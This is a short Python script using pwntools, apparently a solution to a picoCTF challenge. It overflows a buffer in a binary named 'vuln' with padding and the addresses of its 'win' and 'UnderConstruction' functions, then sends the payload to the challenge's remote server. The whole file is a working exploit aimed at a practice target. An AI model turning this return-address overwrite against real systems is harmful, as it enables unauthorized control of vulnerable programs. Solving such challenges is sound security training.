#!/usr/bin/python3

from pwn import *
import os

os.system("clear")

elf = ELF('./vuln')

#io = elf.process()
io = remote("saturn.picoctf.net", 63458)

payload = b""
payload += b"A"*14
payload += p32(elf.symbols['win'])
payload += p32(elf.symbols['UnderConstruction'])

io.sendline(payload)

io.recv()

message = io.recv()

print(message)
